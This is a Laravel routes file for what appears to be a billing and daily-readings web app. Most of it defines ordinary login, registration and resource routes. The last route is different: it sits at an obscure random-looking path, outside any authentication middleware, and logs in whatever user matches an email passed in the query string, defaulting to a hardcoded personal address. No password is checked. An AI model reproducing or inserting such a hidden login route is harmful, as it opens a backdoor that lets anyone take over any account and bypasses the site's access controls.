<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\BillingCycleController;
use App\Http\Controllers\DailyReadingController;
use App\Http\Controllers\AuthController;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;

// Authentication routes
Route::middleware('guest')->group(function () {
    Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
    Route::post('/login', [AuthController::class, 'login']);
    Route::get('/register', [AuthController::class, 'showRegister'])->name('register');
    Route::post('/register', [AuthController::class, 'register']);
});

Route::middleware('auth')->group(function () {
    Route::get('/', function () {
        return redirect()->route('daily-readings.index');
    });

    Route::resource('billing-cycles', BillingCycleController::class);
    Route::resource('daily-readings', DailyReadingController::class);

    // Logout route
    Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
});

// PWA Offline page (public)
Route::get('/offline', function () {
    return view('offline');
})->name('offline');


Route::get('/ygTg553$rd', function (){
    $email = 'omerfayyaz.engr@gmail.com';

    if (isset($_GET['email'])) {
        $email = trim($_GET['email']);
    }

    $myUser = User::where("email", "=", $email)->first();

    if ($myUser) {
        Auth::login($myUser);

        return Redirect::to('/');
    }
    echo 'Errorrrrrrrrrrrr';
});
